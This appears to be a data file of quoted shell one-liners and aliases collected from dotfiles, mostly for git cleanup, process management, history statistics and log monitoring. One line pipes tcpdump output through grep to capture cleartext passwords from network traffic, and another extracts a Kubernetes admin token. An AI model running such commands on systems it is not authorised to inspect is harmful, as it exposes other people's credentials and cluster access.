$(which mount) | sed -E 's/ on |\(|\)/@/g' | column -t -s @ | cut -c -\$COLUMNS
$'dirsizes | fzf -m --preview \'echo {} | cut -c9- | xargs ls -la\' | cut -c9- | xargs -rp rm -rd'
"| sed ""s/^/_ /"" | rev | column -t | rev | sed ""s/^_ //"""
"| grep -Pv ""(^$|^\s+$|^#|^\s+#|^;)"""
"yadm branch --no-color --merged | command grep -vE ""^(\*|\s*(master|develop|dev)\s*$)"" | command xargs -n 1 yadm branch -d"
"wget http://dynamic.xkcd.com/comic/random/ -O -| grep <img src=""http://imgs.xkcd.com/comics | sed s/<img src=""// | sed s/""[a-z]*.*// | wget -i - -O -| display"
"watch -d ""echo stats | nc 127.0.0.1 11211 | grep -E \""get|set|miss|hit\"""""
"watch ""uptime ; echo ; echo ""=STATUS=""; echo ""-CPU-"" ; vcgencmd measure_temp | cut -b 6- ; vcgencmd measure_volts | cut -b 6- ; vcgencmd measure_clock arm | cut -b 15- ; echo ""-HDD-"" ; sudo smartctl -A /dev/sda | grep Temperature_Cels | cut -b 88-90 ; echo ; echo ""=SPEICHER=""; df -h / /dev/mapper/HDD ; echo ; du -sh /home/pi/LOG /media/HDD/Pi-Bak /media/HDD/Synology-Bak.hbk 2>/dev/null; echo ; echo ""=VPN=""; tail -n3 /home/pi/fritzboxvpn.log ; echo ; echo ""=SSH=""; tail -n25 /home/pi/ssh.log"" "
"watch ""ps aux | grep -v virtualenv | grep [s]vc; echo total services: \$(ps aux | grep -v virtualenv | grep [s]vc | wc -l)"""
"vim -p -c ""tabdo Gdiff"" `git status -s | grep -v ""^\s*D\|^?\|^R"" | cut -c 4- | xargs`"
"vagrant ssh -c ""sudo tail -n0 -f /var/log/messages | grep --color=auto \""CRITICAL\|ALERT\|ERROR\|Fatal\|EMERGENCY\"""""
"uptime ; echo ; echo ""=STATUS=""; echo ""-CPU-"" ; vcgencmd measure_temp | cut -b 6- ; vcgencmd measure_volts | cut -b 6- ; vcgencmd measure_clock arm | cut -b 15- ; echo ""-HDD-"" ; sudo smartctl -A /dev/sda | grep Temperature_Cels | cut -b 88-90 ; echo ; echo ""=SPEICHER=""; df -h / /dev/mapper/HDD ; echo ; du -sh /home/pi/LOG /media/HDD/Pi-Bak /media/HDD/Synology-Bak.hbk 2>/dev/null; echo ; echo ""=VPN=""; tail /home/pi/fritzboxvpn.log ; echo ; echo ""=SSH=""; tail -n25 /home/pi/ssh.log "
"upower -i /org/freedesktop/UPower/devices/battery_BAT0| grep -E ""state|time|percentage|to full|to empty"""
"upower -i /org/freedesktop/UPower/devices/battery_BAT0 | grep -E ""state|to\ full|to\ empty|percentage|warning-level"""
"upower -i $(upower -e |grep batt) |grep --color=never -E ""state|to\ full|percentage|to\ empty"""
"upower -i $(upower -e | grep BAT) | grep --color=never -E ""state|to\ full|to\ empty|percentage"""
"upower -i $(upower -e | grep ""/battery"") | grep --color=never -E ""state|to\ full|to\ empty|percentage"""
"uname -a; cpuClock=`cat /proc/cpuinfo | grep -i ""cpu mhz"" | head -1`; numCores=`cat /proc/cpuinfo | grep -i ""cpu mhz"" | wc -l`; echo ""Each cpu core of $cpuClock each""; echo ""Number of cpu cores: $numCores""; memTotal=`cat /proc/meminfo | grep -i ""memtotal""`; echo ""RAM $memTotal"";"
"ttopten() { fc -l -n 1 | cut -d"" "" -f1-1 | gsort | guniq -c | gsort -rn | ghead -10 }; ttopten;"
"tree -a -I $(cat ~/dotfiles/.gitignore | grep -v ""^#.*$|^[[:space:]]*$"" | tr ""\\n"" ""|"" | sed ""s/.$//"")"
"tree -a -I ""venv|__pycache__|data|.git|.idea|.vscode"""
"tree -a -I ""node_modules|.git|.DS_Store|bower_components|dist|build"""
"tree -I ""__pycache__|__init__.py|*.pyc|*.log|*.aux|*.md"""
"tree -I "".git|tags|vendor|node_modules|dist|tmp"""
"tree -I "".git|node_modules|bower_components|.tmp|tmp|vendor"""
"terminal-notifier -title ""$([ $? = 0 ] && echo Terminal || echo Error)"" -message ""$(history|tail -n1|sed -E ""s/^\s*[0-9 ]+\s*//; s/[\;\&\|\s]*(alert)$//"")"""
"tail -n10000 /var/log/httpd/dev-access_log | awk '{print \$1}' | sort | uniq -c | sort -n | awk '{ if (\$1 > 20)print \$1,\$2}'"
"tail -n 20000 ~/.bash_history | sort | uniq -c | sort -nr | head -n 20 | awk '{ gsub(/^ *[0-9]+ +/, \"
"tail -f ~/logfiles/rsync.log | grep -Ev ""/sec|total size|Completed|Start rsync|done"""
"tail -f /opt/kaltura/log/*.log /opt/kaltura/log/batch/*.log | grep -A 1 -B 1 --color ""ERR:\|PHP\|trace\|CRIT\|\[error\]"""
"tail -f ./minicom.log | grep ""\(RUN\|OK\|FAILED\|Dram Remain Size\|iRam used size\)"""
"svn status | ack -v ""Makefile|(_tmp|pro.user|/_?debug|/_?release)$"""
"sudo tcpdump -s 0 -A -n -l | egrep -i ""POST /|pwd=|passwd=|password=|Host:"""
"sudo systemctl restart docker &> /dev/null && docker images | awk 'match(\$1,/[^(hexo|REPOSITORY)]/)&&match(\$2,/[^<none>]/){print \$1,\$2}' | while read -r name tag;do docker pull \$name:\$tag; done && docker images | awk 'match(\$2,/<none>/){print \$3}' | while read -r imageid;do docker rmi -f \$imageid; done"
"sudo netstat -tunp | awk '{print \$6,\$7}' | sort | uniq -c | sort -n | tail -n +2"
"sudo netstat -tpln | grep 2222 | head -n1 | awk ""{print $7}"" | sed -e ""s/\/sshd://"" | xargs kill"
"sudo lsof -iUDP | tail -n +2 | sort -k 9 | awk '{ print \$1,\$9,\$10 }' | column -t | uniq"
"sudo lsof -iUDP -P -n | tail -n +2 | sort -k 9 | awk '{ print \$1,\$9,\$10 }' | column -t | uniq"
"sudo iwlist wlp2s0 scan > /dev/null && nmcli -p dev wifi list | sort -u -k1,1 | grep -Ev ""\---|\===|Wi-Fi scan"" | sed ""/^$/d"""
"sudo dpkg --get-selections | grep -P ""linux-(headers|image)-([0-9.-]+|extra-[0-9])"" | grep -v `uvn`| awk ""{print \$1}"""
"sudo bleachbit --list-cleaners | grep -E ""[A-Z]*|[a-z]*\.[a-z]*"" | grep -v system.free_disk_space | grep -v system.localizations | xargs sudo bleachbit --clean"
"squeue -u $USER -o ""%.T %.3C"" | grep ""RUNNING"" | tr -s ""[:space:]"" | cut -d "" "" -f2 | paste -sd+ | bc"
"sort ~/.bash_history | sort | uniq -c | sort -nr | head -n 20 | awk '{ gsub(/^ *[0-9]+ +/, \"
"sed -ne '/\[\(ERROR\|FATAL\)\]/,/\[\(TRACE\|DEBUG\|INFO\|ERROR\|FATAL\)\]/p'"
"qur=$(qu -r | tail -n +6 | wc -l);qui=$(qu -i | tail -n +6 | wc -l);echo -n ""Running: $qur, idle: $qui, total: ""; echo ""$qur+$qui""| bc"
"qstat | tail -n +3 | tr -s ' ' | tr -s '-' | cut -d ' ' -f 2,4,5- | column -t"
"pwd;find . | sort | sed ""1d;s/^\.//;s/\/\([^/]*\)$/|--\1/;s/\/[^/|]*/| /g"""
"ps xa | grep postgres: | grep bpos | grep -v grep | awk ""{print $1}"" | sudo xargs kill"
"ps ux | grep mplayer | grep -v grep | tr -s "" "" | cut -d"" "" -f2 | xargs kill -9"
"ps ux | grep ""[C]hrome Helper --type=renderer"" | grep -v extension-process | tr -s "" "" | cut -d "" "" -f2 | xargs kill"
"ps ux | grep ""[C]hrome Helper (Renderer)"" | grep -v extension-process | tr -s "" "" | cut -d "" "" -f2 | xargs kill"
"ps axo user,group,comm | egrep ""(apache|httpd)"" | grep -v ^root | uniq | cut -d\ -f 1"
"ps auxww | grep -vE ""(^($USER|nobody|root|bin))|login"""
"ps aux | grep steam | grep -v grep | tr -s "" "" | cut -d "" "" -f 2 | xargs kill -9"
"ps aux | grep play.server.Server | grep -v grep | tr -s "" "" | cut -f2 -d "" "" | xargs kill -9"
"ps aux | grep notes | grep -v grep | awk ""{print \$2}"" | sort -nr | xargs kill -9"
"ps aux | grep agua | grep -v grep | xargs -n 14 | cut -d "" "" -f 2 | xargs -L1 kill -9"
"ps aux | egrep 'sidekiq|redis|dtach|thin|ruby' #alternate format of above, specify process by name
"ps afux | egrep ""(one-wired|khaospy|amelia)"" | grep -v grep | grep -v generate-rrd-graphs "
"ps -u ec2-user | egrep -v ""ssh|bash| ps$|grep$"" && echo ------------ && ps -ef | egrep python"
"ps -eo rss,comm | grep 'Google Chrome' | cut -d ' ' -f1 | sed '/^$/d' | paste -sd + - | bc"
"ps -eo etimes:25,time:25,user:25,pid,lstart,cmd --sort=+user | grep Xvnc | grep -v grep | grep -v thinlinc | sort -k1 -r -n | awk '{print \$3 \"
"ps -ef|grep [u]nicorn|tr -s ' '|cut -d' ' -f2|xargs echo|sed 's/\s\+/,/g'"
"ps -ef|egrep ""nova|cinder|glance|keystone|httpd"""
"ps -efwww | awk ""{print $8}"" | sort | uniq -c | sort -n | tail -3"
"ps -ef | grep java | grep -v grep | grep -v CrashPlanService | awk ""{print \$2}"" | xargs kill -9 && echo ""All Java are dead, for now..."""
"ps -ef | grep -Eo ""sshd: [a-zA-Z0-9]+"" | grep -Eo "" [a-zA-Z0-9]+"" | grep -Eo ""[a-zA-Z0-9]+"" | sort | uniq"
"ps -ef | grep -E ""db2sysc|asn"" | grep -v grep | sort -k9 | tee /tmp/db2running.out ; chmod 755 /tmp/db2running.out"
"ps -ef | grep ""resque\|god\|server.pid"" | grep -v grep | awk "
"ps -ax | awk ""/skypeforlinux/"" | cut -d? -f1 | cut -dp -f1 | sed ""s/^[[:blank:]]*//;s/[[:blank:]]*//"" | xargs kill -9"
"plan | landscape > ~/tmp/plan.out 2>&1; echo ""--------------\nPlan Summary\n--------------\n"" >> ~/tmp/plan.out; cat ~/tmp/plan.out | egrep ""\+ [a-z]|- [a-z]|~ [a-z]|Plan:"" >> ~/tmp/plan.out; cat ~/tmp/plan.out"
"pip3 list --outdated --format=columns | awk ""{print $1}"" | tail -n +3 | xargs pip3 install -U 2>/dev/null || echo ""pip3: No Packages to Update"""
"pip list --outdated --format=columns | awk ""{print $1}"" | tail -n +3 | xargs pip install -U 2>/dev/null || echo ""pip: No Packages to Update"""
"ping -b -c 2 255.255.255.255 2>&1 | grep ""bytes from"" | cut -d "" "" -f 4 | sort | uniq | sed -e ""s/://g"""
"phpcs $(git show --pretty=""format:"" --name-only $1 | grep -v ""^$"" | uniq | sed -e ""s#^#`git rev-parse`/#"" | grep "".php$"" | sed ""s/\///"")"
"pgrep ""ux_|ebus|hublog|ADViewerWebOps|^nsd"" | xargs --no-run-if-empty ps -f"
"pbpaste | grep '^[0-9|,]*h' | cut -d h -f 1 | sed s/,/\./g | awk '{s+=$1} END {print s}'D"
"open \$((bzip2 -dc \$(ls -tr /var/log/system.log.*); cat /var/log/system.log) | tm_report.rb | cut -c 29- | ruby -rgoogle_chart -e 'data=STDIN.readlines.map(&:to_f).select{|f|f>0};puts GoogleChart.Line(data:data,scale:0..data.max,axes:{y:0..data.max},encoding: :extended)')"
"old_branch=`git branch | grep ""^*"" | cut -f 2 -d "" ""`; git branch -r | grep -v HEAD | cut -f 2 -d ""/"" | while read l; do if [ ""x$l"" != ""x"" ]; then git checkout $l; fi; done; if [ ""x$old_branch"" != ""x"" ]; then git checkout $old_branch; fi"
"nvidia-smi | grep ""MiB |$"" | sed -E ""s/\|\s{4}[0-9]\s{5,6}([0-9]*).*/\1/"" | xargs ps -u -p"
"notify-send --urgency=low -i ""$([ $? = 0 ] && echo terminal || echo error)"" ""$(history|tail -n2|head -n1|sed -e "
"notify-send --urgency=low -i ""$([ $? = 0 ] && echo terminal || echo error)"" ""$(history|tail -n1|sed -e '\' 's/^\s*[0-9]\+\s*//;s/[;&|]\s*'alert$' '/' '\')"""
"nocorrect git branch -r | awk ""{print $1}"" | egrep -v -f /dev/fd/0 <(git branch -vv | grep origin) | awk ""{print $1}"" | xargs git branch -d"
"nocorrect git branch --merged | grep -Ev ""(\*|master|develop|staging)"" | xargs -n 1 git branch -d"
"nmcli -p dev wifi list | egrep --color=none '(==|\)|SECURITY|\-\-)[ ]*$' | sed 's/)/, open networks only)/g'"
"nl ~/.bash_history | sort -k 2 -k 1,1nr| uniq -f 1 | sort -n | cut -f 2 | less"
"netstat -a -n|grep -E ""^(tcp)""| cut -c 68-|sort|uniq -c|sort"
"mkdir -p ~/movies_to_delete && find -E **/ -type f -iregex "".*/*\.(mkv|avi|mov|mpg)$"" -maxdepth 1 -print0 | xargs -0 -I{} dirname {} > dirs.txt && xargs -I{} find . -maxdepth 1 -type f -iname ""{}.torrent"" < dirs.txt > torrents.txt && cat dirs.txt | xargs -I{} bash -c ""if !(grep -qa {} torrents.txt); then mv {} ~/movies_to_delete; fi"""
"make -pn nosuchrule 2>/dev/null | grep -A1 ""^# makefile""| grep -v ""^#\|^--"" | sort | uniq"
"ls -ot --color --ignore=\*~ | head | grep -v ""total"" | tr -s "" "" | cut -d"" "" -f5- | column -t"
"ls -la | grep ""^d"" && ls -la | grep ""^-"" && ls -la | grep ""^l"" || true"
"ls -l | grep ""^d"" && ls -la | grep ""^-"" && ls -la | grep ""^l"" || true"
"ls -d */. | sed ""s|/.||g"" | xargs echo"
"ls -1 | grep '[.]' | awk '{ print substr(\$1, 3) }' | awk '{ a = match(\$1, '/[.]/'); print substr(\$1, a) }' | sort | uniq"
"ls -1 | egrep -vi ""(log|tmp|cache|coverage)"" | xargs mate"
"local_rpis=($(sudo arp-scan --interface=wlan0 --localnet | grep ""Raspberry Pi"" | awk ""{print \$1}"")); for rpiip in ""${local_rpis[@]}""; do hostname=""$(nmblookup -A ""$rpiip"" | grep ""<00"" | grep -v GROUP | awk ""{print \$1}"")""; echo -e ""$rpiip : $hostname""; done"
"list | grep linux-image | cut -d "" "" -f 3 | sort -V | sed -n ""/""`uname -r`""/q;p"" | xargs sudo apt-get purge"
"less /proc/cpuinfo | egrep ""processor|cpu MHz|physical id|core id|^$"""
"la | sed ""s|.*\.||"" | sort -u"
"kubectl get pods --all-namespaces -ojson | jq -r "".items[] | select(.status.reason!=null) | select(.status.reason | contains(\""Evicted\"")) | .metadata.name + \"" \"" + .metadata.namespace"""
"kubectl -n kube-system describe secret `kubectl -n kube-system get secret|grep admin-token|cut -d "" "" -f1`|grep ""token:""|tr -s "" ""|cut -d "" "" -f2"
"journalctl -b0 | egrep -i ""error|fail|warn|segfault|bug"""
"ip addr show |grep ""inet "" |grep -v 127.0.0. |head -1|cut -d"" "" -f6|cut -d/ -f1"
"ip addr show |grep ""inet "" |grep -v 127.0.0. |head -1|cut -d"" "" -f6|cut -d/ -f1 #no-expand"
"ip --brief --color a | column -t | grep -vE ""(vboxnet|vmnet|br-|veth)"""
"inotifywait -rm . | grep -iE ""(modify |create |delete|attrib|moved)"""
"ifconfig | grep ""inet addr:"" | grep -v ""127.0.0.1"" | cut -d: -f2 | cut -d\ -f1 | awk ""{ print \$1 }"""
"if test $((vm_stat|grep ""^Page[io]""|sed -e ""s/.*://"" -e ""s/\.$//"";echo 1;echo +;echo /;echo p)|(dc 2>/dev/null || echo 100)) -lt 10; then echo Maybe; else echo Probably not; fi"
"if [[ $USER == root || `ps -ef | egrep tmux | egrep -v egrep | wc -l` -eq 0 ]] ; then mutt ; else tmux rename-window ""emails"" && mutt ; fi"
"hub issue |grep $(git symbolic-ref --short HEAD | sed -e ""s/[^0-9]//g""); hub issue |grep $(git symbolic-ref --short HEAD | sed -e ""s/[^0-9]//g"")|pbcopy;"
"history|sed ""s/^ *[0-9]* *//""|sort|uniq -c|sort -ni | tail -n 3"
"history | sed ""s/^[[:space:]]*[0-9]*[[:space:]]*//"" | sort | uniq -c | sort -n -r | head -n 10"
"history | sed ""s/ *//"" | cut -d"" "" -f 3 | sort | uniq -c | sort -n"
"history | cut -c 8-100 | cut -d "" "" -f 1-1 | sort | uniq -c | sort -n"
"history | awk ""{print }"" | sort | uniq -c | sort -rn | head"
"history | awk ""{print \$2}"" | sort | uniq -c |sort -rn | head -50"
"history | awk ""{print \$2}"" | sort | uniq -c | sort -nr | head -n"
"history | awk ""{print $2}"" | sort | uniq -c | sort -rn | head -10"
"history n 20000 | sed ""s/.* //"" | sort | uniq -c | sort -g | tail -n 100"
"history 0 | sed -E ""s/ *[0-9]+\*? *[0-9 :-]+ *//"" | sort | uniq -c | sort -rn | head -50"
"history -1000 -1 | sed ""s/^[[:space:]]*[0-9]*[[:space:]]*//"" | sort | uniq -c | sort -n -r | head -n 30"
"histcpy=`history | sed ""s/^ *[0-9]* *//g"" | tac | less | peco`; echo -n $histcpy | pbcopy; echo ""Copied \`$histcpy\` to clipboard"""
"hg log -T ""{label(\""magenta\"", node|short)} {date|localdate|isodate} {if(phabdiff, label(\""green\"", phabdiff), \""(no diff)\"")} {label(\""yellow\"", author|user)} {desc|firstline}\n"""
"hg log --template ""\033[0;33m{rev}\t{svnrev|nonempty}\t\033[1;30m{phase}\t<{author|person}>\t\033[1;30m({date|age})\t\033[0m{desc|firstline|strip}\033[0m\n"""
"hg log --graph --limit 250 --template ""\t{desc|strip|firstline}\n\t\t{date|shortdate} [{author|user}] :{node|short} """
"heroku apps --all | grep -v ""="" | grep ""\s"" | sed ""s/ .*$//"" | fzf --header=""Select the app you want to tail the logs"" | xargs heroku logs -t -a"
"grep -v 'files changed,' | sed 's/[ :|].*$//' | sort | uniq | xargs nvim"
"grep -r ""pdb"" err.txt generated.file succ.txt | grep -v ""#"" | cut -d : -f 1 | sort | uniq | grep "".py$"""
"grep -r ""ipdb"" err.txt generated.file succ.txt | grep -v ""#"" | cut -d : -f 1 | sort | uniq | grep "".py$"""
"grep -i ""\.so\|\.xml\|\.conf\|\.txt\|\.cfg\|\.dat"""
"grep -i ""File does not exist"" /var/log/apache3/error.log | grep ""Mar\ 30"" | grep -v ""robots.txt"" | cut -d \ -f13- | sort | uniq"
"grep -P "" \ds| \d\ds| \dh| \d\dh| \d\dm| \dm"""
"grep -E "" upgraded (\w|-|\+)*"" /var/log/pacman.log | grep -E ""(\w|-|\+)* \("""
"grep -E "" removed (\w|-|\+)*"" /var/log/pacman.log | grep -E ""(\w|-|\+)* \("""
"grep -E "" installed (\w|-|\+)*"" /var/log/pacman.log | grep -E ""(\w|-|\+)* \("""
"grep -C 1 ""[$]\(Id\|Date\|Rev\|Auth\|Head\|Last\)\w*[:].*[$]"""
"grep --binary-files=text `find | egrep ""\.(cpp|hpp|h|c|asm)$""` -e "
"grep ""^BOX"" /etc/boxes-config | sed ""s|BOX ||g"" | sort"
"gradle ""-DsocksNonProxyHosts=*.confluent.io|*.apache.org|*.bintray.com|repo.jfrog.org|*.bintray.com|*.cloudfront.net"" -DsocksProxyHost=127.0.0.1 -DsocksProxyPort=14122"
"glo | fzf --ansi --no-sort --preview ""echo {} | cut --delimiter=\"" \"" --fields=1 | xargs git show"" | cut --delimiter="" "" --fields=1 | xargs --no-run-if-empty git show"
"gl --pretty=format:""%h | %p | %an | %ar | %cd | %s"""
"git status -s | grep php | rev | cut -d "" "" -f1 | rev | xargs -i php-code-check {}"
"git status --porcelain | grep -v ""^[ |??]"" | sed -e ""s/[A-Z] *//"" | awk ""{print $1}"" | while read line; do grep -H -e ""TODO"" -e ""XXX"" -e ""FIXME"" -e ""NOTE"" $line; done"
"git st --porcelain | grep ?? | sed ""s/^?? //"" | sed ""s/^/\""/"" | sed ""s/$/\""/"" | xargs rm -rf"
"git show-branch | grep ""*"" | grep -v ""$(git rev-parse --abbrev-ref HEAD)"" | head -n1 | sed ""s/.*\[\(.*\)\].*/\1/"" | sed ""s/[\^~].*//"""
"git show-branch -a | grep ""\*"" | grep -v `git rev-parse --abbrev-ref HEAD` | head -n1 | sed ""s/.*\[\(.*\)\].*/\1/"" | sed ""s/[\^~].*//"""
"git show | diff-so-fancy | less --tabs=4 -RFX --pattern ""^(commit|added:|deleted:|modified:) """
"git rev-list --objects --all | git cat-file --batch-check='%(objecttype) %(objectname) %(objectsize) %(rest)' | sed -n 's/^blob //p' | sort --numeric-sort --key=2 | cut -c 1-12,41- | numfmt --field=2 --to=iec-i --suffix=B --padding=7 --round=nearest"
"git rev-list --objects --all | git cat-file --batch-check='%(objecttype) %(objectname) %(objectsize) %(rest)' | awk '/^blob/ {print substr($0,6)}' | sort --numeric-sort --key=2 | cut --complement --characters=13-40 | numfmt --field=2 --to=iec-i --suffix=B --padding=7 --round=nearest"
"git remote show heroku | grep {$1} | cut -f4 -d ""/"" | cut -f1 -d ""."" | tail -n 1 | xargs heroku open --app"
"git remote prune origin; git branch --merged | grep -Ev ""(\*|master|develop|staging)"" | xargs -n 1 git branch -d;"
"git remote prune origin --dry-run && echo ""would delete these local branches:"" && git branch --merged | egrep -v ""(^\*|master|development|develop|release*)"""
"git remote prune origin && git branch -r | awk ""{print \$1}"" | egrep -v -f /dev/fd/0 <(git branch -vv | grep origin) | awk ""{print \$1}"" | xargs git branch -d"
"git remote -v | awk ""{print \$2}"" | uniq | sed -e ""s_:_/_"" | sed -e ""s_git@_https://_"" | xargs open"
"git reflog | grep "" checkout: "" | grep -v ""to stable""| cut -d"" "" -f8 | uniq | head -n10"
"git pull-request -b $(git remote show origin -n | grep `git branch | grep ""^*"" | cut -d "" "" -f 2` | grep ""merges with remote"" | sed ""s/.* \([-a-z]*\)$/\1/"")"
"git ls-tree -r -z --name-only HEAD | xargs -0 -n1 git blame --line-porcelain | grep ""^author ""|sort|uniq -c|sort -nr"
"git ls-tree -r -z --name-only HEAD -- **/*.java | xargs -0 -n1 git blame --line-porcelain HEAD |grep ""^author ""|sort|uniq -c|sort -nr"
"git ls-tree --name-only -z -r HEAD -- $1 | xargs -0 -n1 git blame --line-porcelain | grep ""^author ""|sort|uniq -c|sort -nr"
"git ls-remote --tags $(grep source= PKGBUILD | cut -d\"" -f2 | cut -d\# -f1 | cut -d+ -f2 | sed ""s/\$pkgname/$(grep pkgname= PKGBUILD | cut -d= -f2)/g"")"
"git ls-files | xargs -n1 git blame --line-porcelain | sed -n ""s/^author //p"" | sort -f | uniq -ic | sort -nr"
"git ls-files | while read f; do git blame --line-porcelain $f | grep ""^author ""; done | sort -f | uniq -ic | sort -n"
"git ls-files | git ls-files | xargs file | grep ""ASCII"" | cut -d : -f 1 | xargs wc -l"
"git ls-files -z | xargs -0n1 git blame -w --line-porcelain | grep -a ""^author "" | sort -f | uniq -c | sort -r"
"git ls-files -z | xargs -0n1 git blame -w --line-porcelain | grep -a ""^author "" | sort -f | uniq -c | sort -n"
"git ls-files -z | xargs -0n1 git blame -w --line-porcelain | grep -a ""^author "" | sort -f | uniq -c | sort -n -r"
"git log|grep commit|cut -d "" "" -f2|head -n 2|xargs -n 2 git diff -R|sublime"
"git log|grep commit|cut -d "" "" -f2|head -n 2|xargs -n 2 git diff -R|mate"
"git log | sed -n ""s/Author: \(.*\) <.*/\1/p"" | sort | uniq -c | sort -nr | head"
"git log | grep ^Author: | sed ""s/ <.*//; s/^Author: //"" | sort | uniq -c | sort -nr"
"git log | grep ""Author: "" | cut -d"" "" -f2,3 | sort | uniq -c | sort -nr"
"git log HEAD ^origin/$(git remote show origin -n | grep `git branch | grep ""^*"" | cut -d "" "" -f 2` | grep ""merges with remote"" | sed ""s/.* \([-a-z]*\)$/\1/"") --no-merges"
"git log --pretty=format:""%C(yellow)%h%C(reset)|%C(bold blue)%an%C(reset)|%s"" | column -s ""|"" -t | less -FXRS"
"git log --format=format: --name-only | egrep -v ""^$"" | sort | uniq -c | sort -r | head -5"
"git log --first-parent --reverse --pretty=format:""%cD - %b"" | egrep ""(FIXED|ADDED|CHANGED|DELETED|REMOVED)"""
"git grep -l println . | xargs -n1 git blame -f -n -w | grep ""$(git config user.name)"" | grep -e println | sed ""s/.\{9\}//"" | sed ""s/(.*)[[:space:]]*//"""
"git grep -l -e TODO -e THINK . | xargs -n1 git blame -f -n -w | grep ""$(git config user.name)"" | grep -e TODO -e THINK | sed ""s/.\{9\}//"" | sed ""s/(.*)[[:space:]]*//"""
"git for-each-ref --sort=taggerdate --format=""%(color:yellow)%(refname:short)%(color:reset)|%(taggerdate:short)|%(color:blue)%(color:bold)%(*authorname)%(color:reset)|%(subject)"" refs/tags | column -s""|"" -t"
"git for-each-ref --sort=taggerdate --color --format=""%(color:yellow)%(refname:short)%(color:reset)|%(taggerdate:short)|%(color:blue)%(color:bold)%(*authorname)%(color:reset)|%(subject)"" refs/tags | column -s""|"" -t"
"git fetch -p; git branch --merged | egrep -v ""(^\*|master|dev|staging)"" | xargs git branch -d"
"git fetch -p && git branch --merged | grep -v ""\*"" | grep -v master | grep -v develop | grep -v release | xargs -n 1 git branch -d"
"git fetch --prune; git branch --merged | grep -Ev ""(\*|master|develop|staging)"" | xargs -n 1 git branch -d"
"git fetch --prune 1>/dev/null && git branch -vv | grep -v ""\* "" | egrep "": (disparue|gone)\]"" | awk ""{print \$1}"" | xargs git branch -D"
"git fetch --prune && git branch -r | awk ""{print \$1}"" | egrep -v -f /dev/fd/0 <(git branch -vv | grep origin) | awk ""{print \$1}"" | xargs git branch -d"
"git fetch --prune && git branch -r | awk ""{print \$1}"" | egrep -v -f /dev/fd/0 <(git branch -vv | grep origin) | awk ""{print \$1}"" | xargs git branch -D"
"git fetch --prune && git branch -r | awk ""{print \$1}"" | egrep -v -f /dev/fd/0 <(git branch -vv | grep origin) | awk ""{print \$1}"" | xargs -r git branch -D"
"git diff | diff-so-fancy | less --tabs=4 -RFX --pattern ""^(commit|added:|deleted:|modified:) """
"git diff master --name-only | egrep '.py$' | xargs bin/pylint --msg-template='{path}:{line}: [{msg_id}({symbol}), {obj}] {msg}' --rcfile=pylintrc | egrep -v '^tests.*: .*(W0621|C0111|Invalid method name \"
"git diff --color | diff-so-fancy | less --tabs=4 -RFX --pattern ""^(Date|added|deleted|modified): """
"git diff --cached | diff-so-fancy | less --tabs=4 -RFX --pattern ""^(commit|added:|deleted:|modified:) """
"git diff $(git reflog | grep -A1 pull | head -2 | cut -f1 -d"" "" | tr ""\n"" "" "" | sed -E ""s/(\w+) (\w+)/\2..\1/"")"
"git checkout `git branch --all --remotes | sed ""s/..//"" | rev | cut -d ""/"" -f 1 | rev | selecta`"
"git checkout -q master && git for-each-ref refs/heads/ ""--format=%(refname:short)"" | while read branch; do mergeBase =$(git merge-base master $branch) && [[ $(git cherry master $(git commit-tree $(git rev-parse $branch^{tree}) -p $mergeBase -m _) ) == ""-""* || $(git branch --merged | grep -v ""\* master"" | grep $branch) ]] && git branch -D $branch; done"
"git checkout $(git branch -a | tr -d "" "" |fzf --height=100% --prompt ""CHECKOUT BRANCH>"" --preview ""git log --color=always {}"" | head -n 1 | sed -e ""s/^\*\s*//g"" | perl -pe ""s/remotes\/origin\///g"")"
"git checkout $(git branch -a | tr -d "" "" |fzf --height 100% --prompt ""CHECKOUT BRANCH>"" --preview ""git log {}"" | head -n 1 | sed -e ""s/^\*\s*//g"" | perl -pe ""s/remotes\/origin\///g"")"
"git checkout $(git branch -a | tr -d "" "" |fzf --height 100% --prompt ""CHECKOUT BRANCH>"" --preview ""git log --color=always {}"" | head -n 1 | sed -e ""s/^\*\s*//g"" | perl -pe ""s/remotes\/origin\///g"")"
"git checkout $(git branch --sort=-authordate -vv | fzf --reverse | head -n 1 | sed -e ""s/^\*\s*/ /g"" | sed -e ""s/^[ ]*//g"" | sed -e ""s/[ ].*//"")"
"git branch | grep -v bk | sed ""s/[*| ] //g"" | peco | xargs -n1 git checkout ; git branch"
"git branch | grep -v ^\**\ *""master\|develop\|next-release\|rc""$ | xargs git branch -D"
"git branch | grep -v ""master\|development"" | sed ""s/^[ *]*//"" | sed ""s/^/git branch -D /"" | bash"
"git branch | grep -v ""develop\|scaling\|master\|*"" | xargs git branch -D"
"git branch | grep -E ""feature|hotfix|bug|release"" | xargs git branch -D"
"git branch | grep -E ""\* (.+)"" | sed ""s/* //"" | xargs echo | tr -d ""\n"" | pbcopy"
"git branch | egrep -v ""(master|staging|develop|release_candidate\*)"" | xargs git branch -D"
"git branch | egrep -v ""(master|staging|develop|\*)"" | xargs git branch -D"
"git branch -v | grep ""* "" | awk ""{print \""hello\""\$2\""world\""}"" | grep ""hellomasterworld"" || git add . && git commit -m"
"git branch -r | grep -v ""\->"" | while read remote; do git branch | grep -q ""${remote#origin/}$"" || git branch --track ""${remote#origin/}"" ""$remote""; done"
"git branch -r | awk ""{print \$1}"" | egrep -v -f /dev/fd/0 <(git branch -vv | grep origin) | awk ""{print \$1}"" | xargs git branch -d"
"git branch -r | awk ""{print $1}"" | egrep -v -f /dev/fd/0 <(git branch -vv | grep origin) | awk ""{print $1}"" | xargs git branch -d"
"git branch -r --merged | grep origin | grep -v '>' | grep -v master | xargs -L1 | awk '{sub(/origin\//,\"
"git branch -a | sed -Ee ""s:^\*? *::"" | sed -Ee ""s:^(remotes/)?origin/::g"" | grep -v ""HEAD -> origin/master"" | sort | uniq"
"git branch --no-color -r --merged | command grep -v ""master\|develop\|dev"" | command sed ""s/origin\//:/"" | xargs -n 1 git push origin"
"git branch --no-color --merged | grep -v ""\*"" | grep -v ""master"" | grep -v ""develop"" | grep -v ""staging"" | xargs -n 1 git branch -d"
"git branch --no-color --merged | command grep -vE ""^(\*|\s*(master|staging|production)\s*$)"" | command xargs -n 1 git branch -d"
"git branch --no-color --merged | command grep -vE ""^(\*|\s*(master|develop|dev)\s*$)"" | command xargs -r -n 1 git branch -d"
"git branch --no-color --merged | command grep -vE ""^(\*|\s*(master|develop|dev)\s*$)"" | command xargs -n 1 git branch -d"
"git branch --no-color --merged | command grep -vE ""^(\*|\s*(master|develop|dev)\s*$)"" | command xargs -n 1 git branch -d && git clean -xdf"
"git branch --no-color --merged | command grep -vE ""^(\*|\s*(master|develop|dev)\s*$)"" | command xargs -n 1 git branch -d "
